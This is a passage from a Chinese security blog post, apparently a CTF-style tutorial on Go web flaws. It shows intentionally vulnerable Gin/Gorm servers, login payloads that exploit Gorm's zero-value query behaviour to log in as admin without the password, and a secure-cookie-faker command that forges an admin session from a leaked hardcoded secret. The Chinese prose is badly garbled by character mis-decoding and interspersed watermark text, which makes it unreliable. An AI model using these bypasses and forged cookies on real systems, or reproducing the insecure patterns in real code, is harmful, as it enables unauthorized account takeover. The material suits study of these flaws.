    db<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> gorm<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>sqlite<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>gorm<span class="token punctuation">.</span>Config<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span><span class="token function">AutoMigrate</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Username<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> Password<span class="token punctuation">:</span> randPassword<span class="token punctuation">,</span> Role<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Username<span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> Password<span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> Role<span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"helloworld"</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">LoginHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> user User
    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

    username <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>
    password <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>

    result <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Username<span class="token punctuation">:</span> username<span class="token punctuation">,</span> Password<span class="token punctuation">:</span> password<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span>
    <span class="token keyword">if</span> result<span class="token punctuation">.</span>Error <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"error"</span><span class="token punctuation">:</span> result<span class="token punctuation">.</span>Error<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>

    session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span>Role<span class="token punctuation">)</span>
    session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"login as "</span> <span class="token operator">+</span> user<span class="token punctuation">.</span>Username <span class="token operator">+</span> <span class="token string">" success"</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

    role <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"unauthorized"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token punctuation">{</span>
        flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"welcome admin"</span><span class="token punctuation">,</span>
            <span class="token string">"flag"</span><span class="token punctuation">:</span>    <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"only admin can get flag"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    secret <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>

    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>

    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> LoginHandler<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>

    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>

<p>é¢˜â½¬æ•°æ®åº“å­˜åœ¨ admin å’Œ <span class="hexo-wm">êœ±â€ŒÂ³ğ˜·ï½…ğ’ï¼â€‹â€Œsâ…ˆï»¿â€teï»¿â€Œ</span>guest ä¸¤ä¸ªè´¦æˆ·, ä½†æ˜¯ admin çš„å¯†ç ä¸ºéšæœºçš„ md5, â½†æ³•ç›´</p>
<p>æ¥ç™»å½•, æˆ‘ä»¬ä»…æ‹¥æœ‰ <span class="hexo-wm">Ñ•ï»¿â€ŒÂ³ğ¯ï½…ğ’â€¤â€‹ğ˜´ğ˜ªâ€‹ğ’•ğ˜¦â€</span>guest çš„è´¦å·å¯†ç </p>
<p><code>/flag</code> è·¯ç”±é™åˆ¶åªæœ‰ <span class="hexo-wm">ğ˜€â€‹ï»¿â‘¶ğ¯ï½…ğ˜¯â€¤ï»¿êœ±ğ¢â€Œâ€Œğ˜µğ˜¦â€Œ</span>role ä¸º admin æ—¶æ‰èƒ½æŸ¥çœ‹ flag</p>
<p><code>/login</code> è·¯ç”±â½¤äºå¤„ç†â½¤æˆ·ç™»å½•,<span class="hexo-wm">ğ˜€â€‹â€ğŸ¯ğ’—ğï½ï¼â€‹ğ’”ğ¢â€ï»¿ğ­ï½…ï»¿â€‹</span> æ³¨æ„åˆ°è¿™â¼€å¥</p>
<pre class="language-go" data-language="go"><code class="language-go">result <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Username<span class="token punctuation">:</span> username<span class="token punctuation">,</span> Password<span class="token punctuation">:</span> password<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span></code></pre>

<p>Where â½…æ³•ä¸­ä¼ â¼Šäº†â¼€ä¸ª User ç»“æ„ä½“, å…¶ Username <span class="hexo-wm">êœ±â€Â³â…´ğğ§â€¢ï»¿ğ¬ğ˜ªâ€‹ï»¿ğ˜µğ˜¦â€Œï»¿</span>å’Œ Password çš„å€¼é€šè¿‡ post â½…æ³•ä¼ â¼Š</p>
<p>ç»“åˆä¸Šâ¾¯çš„çŸ¥è¯†ç‚¹, æˆ‘ä»¬å¯ä»¥æ„é€ â¼€äº› <span class="hexo-wm">êœ±â€3ğ˜·eğ§ï¼â€‹â€ğ’”ğ¢â€â€‹ğ’•ï½…â€‹</span>â€œé›¶å€¼â€, ä½¿å¾—åœ¨æœªçŸ¥ admin å¯†ç çš„æƒ…å†µä¸‹, è®©æ•°æ®åº“æŸ¥è¯¢å‡º admin è´¦æˆ·, ä»â½½æˆåŠŸç™»å½•</p>
<p><code>username=&amp;password=</code> , å³ username å’Œ password <span class="hexo-wm">êœ±ï»¿ğŸ¯ğ¯ğ˜¦ğ’Â·â€ï»¿êœ±ğ¢â€ğ’•ğ˜¦â€‹</span>éƒ½ä¸ºç©º, è¿™ç§æƒ…å†µä¸‹æ•°æ®åº“å°†ä¼šè¿”å› users è¡¨ä¸­çš„ç¬¬â¼€ä¸ªâ½¤æˆ· admin</p>
<p><code>username=admin&amp;password=</code> , ä»… password ä¸ºç©º,<span class="hexo-wm">sâ€Œâ€ğŸ¯â…´â„¯ï½ï¼â€Œğ˜€ğ¢â€‹ğ˜µeï»¿</span> é‚£ä¹ˆè¿™æ—¶å€™æ„å»ºçš„ SQL è¯­å¥å°±ç›¸å½“äº <code>SELECT * FROM users WHERE username = "admin"</code> , å°†ä¼šè¿”å› admin çš„æ•°æ®</p>
<h2 id="4-Gin-ç›¸å…³"><a href="#4-Gin-ç›¸å…³" class="headerlink" title="4. Gin ç›¸å…³"></a>4. Gin ç›¸å…³</h2><p>Gin æ¡†æ¶ä½¿â½¤ gin-contrib/sessions ä½œä¸º session ä¸­é—´ä»¶, â½½ gin-<span class="hexo-wm">sï»¿â€ŒğŸ¯â…´ï½…ğ˜¯.â€â€ŒÑ•ï½‰â€Œâ€‹ğ’•ğâ€â€</span>contrib/session å®é™…åŸºäº gorilla/session , å…¶ä½¿â½¤äº† gorilla/securecookie å¯¹ cookie è¿›â¾ç­¾åæˆ–åŠ å¯†</p>
<p>gorilla/securecookie â½¤äºäº§â½£â¼€ä¸ª â€œå®‰å…¨çš„ cookieâ€, å®ƒâ½€æŒä½¿â½¤ HMAC å¯¹ cookie è¿›â¾ç­¾å, æˆ–è€…ä½¿â½¤ AES <span class="hexo-wm">êœ±â€‹ğŸ¯ğ¯eï½â€¤â€‹ğ¬ğ¢â€‹â€Œtï½…â€‹</span>ç®—æ³•å¯¹ cookie è¿›â¾åŠ å¯†, cookie çš„å†…å®¹é»˜è®¤ä½¿â½¤ gob (Go Binary) æ ¼å¼è¿›â¾åºåˆ—åŒ–</p>
<p>é»˜è®¤ gin-contrib/sessions ä»…å¯¹ session è¿›â¾ç­¾å, åœ¨ä½¿â½¤ session æ—¶éœ€è¦æŒ‡å®šâ¼€ä¸ªâ½¤äºç­¾åçš„ secret</p>
<p>è¿™ç§æƒ…å†µå¯ä»¥ç±»â½ flask çš„å®¢æˆ·ç«¯ session,<span class="hexo-wm">sï»¿â€‹â‘¶ğ¯ğ˜¦ğ’âˆ™â€Œâ€Ñ•ğ¢â€Œtï½…ï»¿â€‹</span> å³ session å¯èƒ½ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯, ä¸”å½“ secret å·²çŸ¥æ—¶, å¯ä»¥ä¼ªé€  session</p>
<p>eg.</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"os"</span>

    <span class="token string">"github.com/gin-contrib/sessions"</span>
    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>
    <span class="token string">"github.com/gin-gonic/gin"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

    <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span>
        session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    role <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>

    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"welcome "</span> <span class="token operator">+</span> role<span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

    role <span class="token operator">:=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"unauthorized"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token punctuation">{</span>
        flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"welcome admin"</span><span class="token punctuation">,</span>
            <span class="token string">"flag"</span><span class="token punctuation">:</span>    <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"only admin can get flag"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"Th1s_1s_a_S3cret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>

    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>

    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>

<p><code>/flag</code> è·¯ç”±éœ€è¦ <code>role=admin</code> æ‰èƒ½è®¿é—®, <span class="hexo-wm">êœ±ï»¿â€ŒğŸ¯ğ˜·â„¯ğ˜¯â€¢â€â€ğ˜€â…ˆâ€Œâ€‹ğ­eâ€‹</span>é»˜è®¤çš„ index è·¯ç”±ä»…èƒ½è·å¾— <code>role=guest</code> çš„ session</p>
<p>ä½†æ˜¯æºç ä¸­æ³„éœ²äº†â½¤äºç­¾å session çš„ secret, é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½é€šè¿‡è¿™ä¸ª secret ä¼ªé€ â¼€ä¸ª <code>role=admin</code> çš„ session, <span class="hexo-wm">ğ¬ï»¿â‘¶ğ’—eï½ï¼â€Œï»¿ğ’”ğ¢â€Œğ’•â„®â€ï»¿</span>è¿›â½½è·å¾— flag</p>
<p>æœ‰ä¸¤ç§â½…å¼ï¼š</p>
<ul>
<li>ä½¿â½¤ secure-cookie-<span class="hexo-wm">ğ’”ï»¿ğŸ¯ğ˜·ï½…ï½âˆ™â€‹sğ¢â€ğ­ğ˜¦â€Œâ€‹</span>faker â¼¯å…·</li>
<li>â¾ƒå»ºâ¼€ä¸ªä½¿â½¤ç›¸åŒ secret çš„ gin web server</li>
</ul>
<p>ä»¥ç¬¬â¼€ç§â½…å¼ä¸ºä¾‹,<span class="hexo-wm">Ñ•ï»¿â‘¶â…´â„¯ğ’â€¤â€‹Ñ•iâ€‹ğ˜µğâ€Œ</span> åˆ©â½¤å·²çŸ¥ secret ä¼ªé€  session</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">./secure-cookie-faker enc <span class="token parameter variable">-n</span> <span class="token string">"gosession"</span> <span class="token parameter variable">-k</span> <span class="token string">"Th1s_1s_a_S3cret"</span> <span class="token parameter variable">-o</span> <span class="token string">"{role[string]:admin[string]}"</span></code></pre>
</body></html>
        </div>
        
          <div class="prev-or-next">
            <div class="post-foot-next">
              
                <a href="../../write-up/2024-ciscn-qual-writeup/" target="_self">
                  <i class="iconfont icon-chevronleft"></i>
                  <span>ä¸Šä¸€é¡µ</span>
                </a>
              
            </div>
            <div class="post-foot-prev">
              
                <a href="../cve-2024-37704-mysql-connector-java-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_self">
                  <span>ä¸‹ä¸€é¡µ</span>
                  <i class="iconfont icon-chevronright"></i>
                </a>
              
            </div>
          </div>
        
      </div>
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="catalog-zoom">
      <div class="title">ç›®å½•</div>
      <div class="catalog-content">
        
          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. æ•´æ•°æº¢å‡ºæ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Go-%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-text">Go è¯­è¨€æ•°æ®ç±»å‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%B1%BB%E5%9E%8B"><span class="toc-text">æ•°å­—ç±»å‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%AE%E7%82%B9%E5%9E%8B"><span class="toc-text">æµ®ç‚¹å‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%95%B0%E5%AD%97%E7%B1%BB%E5%9E%8B"><span class="toc-text">å…¶ä»–æ•°å­—ç±»å‹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Go-SSTI-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-text">2. Go SSTI æ¨¡ç‰ˆæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">2.1 ä¿¡æ¯æ³„éœ²</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">2.2 å‘½ä»¤æ‰§è¡Œ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Gorm-%E7%9B%B8%E5%85%B3"><span class="toc-text">3. Gorm ç›¸å…³</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-text">3.1 SQL æ³¨å…¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-text">3.2 æƒé™ç»•è¿‡</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Gin-%E7%9B%B8%E5%85%B3"><span class="toc-text">4. Gin ç›¸å…³</span></a></li></ol>
        
      </div>
    </div>
  </div>

  
<script src="../../js/catalog.js"></script>




    
  </div>
  <script>
    (() => {
      function compensate() {
        const bodyBox = document.querySelector('.zoom-wrap');
        if (bodyBox) {
          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
          bodyBox.style.marginBottom = `-${gapY}px`;
        }

        const catBox = document.querySelector('.catalog-zoom');
        if (catBox) {
          const rect = catBox.getBoundingClientRect();
          const gapX = catBox.offsetWidth  - rect.width;
          const gapY = catBox.offsetHeight - rect.height;

          const list = catBox.querySelector('.catalog-content');
          if (list) {
            const orig = list.dataset.origHeight
                      ? parseFloat(list.dataset.origHeight)
                      : parseFloat(getComputedStyle(list).height);
            list.dataset.origHeight = orig;
            list.style.height       = (orig + gapY) + 'px';
          }

          catBox.style.marginRight  = `-${gapX}px`;
          catBox.style.marginBottom = `-${gapY}px`;
        }
      }

      function hookImages(root = document) {
        root.querySelectorAll('img').forEach(img => {
          if (img.dataset._scaledFix) return;
          img.dataset._scaledFix = 1;
          img.addEventListener('load', compensate, {once: true});
        });
      }

      addEventListener('DOMContentLoaded', () => {
        compensate();
        hookImages();
      });

      addEventListener('resize', compensate);

      const observer = new MutationObserver(muts => {
        muts.forEach(m => {
          m.addedNodes.forEach(n => {
            if (n.nodeType !== 1) return;
            if (n.tagName === 'IMG') hookImages(n.parentNode);
            else hookImages(n);
          });
        });
      });

      const wrap = document.querySelector('.zoom-wrap');
      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
    })();
  </script>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" href="https://github.com/security-s3ven">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/security-s3ven">Copyright Â© 2023-2026 s3ven</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="../../js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
